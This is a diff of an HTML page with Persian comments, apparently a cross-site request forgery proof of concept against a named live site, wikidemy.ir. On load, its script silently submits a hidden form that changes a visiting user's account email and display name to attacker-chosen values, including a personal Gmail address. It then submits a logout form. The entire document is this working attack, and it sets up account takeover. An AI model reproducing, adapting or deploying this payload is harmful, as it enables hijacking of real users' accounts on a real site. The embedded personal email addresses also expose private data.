@@ -1,11 +1,11 @@
 <html>
   <body>
-    <!-- فرم اول -->
+    <!-- فرم اول: ویرایش اطلاعات کاربری -->
     <form id="form1" action="https://wikidemy.ir/my-account/edit-account/" method="POST">
       <input type="hidden" name="account&#95;first&#95;name" value="mmd" />
       <input type="hidden" name="account&#95;last&#95;name" value="mmddd" />
-      <input type="hidden" name="account&#95;display&#95;name" value="ashkanpyrr" />
-      <input type="hidden" name="account&#95;email" value="ashkansolgy86@gmail.com" />
+      <input type="hidden" name="account&#95;display&#95;name" value="ashkanpayervand" />
+      <input type="hidden" name="account&#95;email" value="ashkanpayervand86&#64;gmail&#46;com" />
       <input type="hidden" name="password&#95;current" value="" />
       <input type="hidden" name="password&#95;1" value="" />
       <input type="hidden" name="password&#95;2" value="" />
@@ -15,19 +15,19 @@
       <input type="hidden" name="action" value="save&#95;account&#95;details" />
     </form>
 
-    <!-- فرم دوم -->
+    <!-- فرم دوم: خروج از حساب کاربری -->
     <form id="form2" action="https://wikidemy.ir/my-account/customer-logout/">
-      <input type="hidden" name="&#95;wpnonce" value="c25742d4ef" />
+      <input type="hidden" name="&#95;wpnonce" value="3a32c5e703" />
     </form>
 
     <script>
-      // اجرای فرم اول
+      // ارسال فرم اول
       document.getElementById('form1').submit();
 
       // منتظر ماندن برای ارسال فرم اول و سپس ارسال فرم دوم
       setTimeout(function () {
         document.getElementById('form2').submit();
-      }, 1000); // 1000 میلی‌ثانیه (1 ثانیه) تأخیر برای اطمینان از تکمیل فرم اول
+      }, 1000); // 1000 میلی‌ثانیه (1 ثانیه) تأخیر
     </script>
   </body>
 </html>
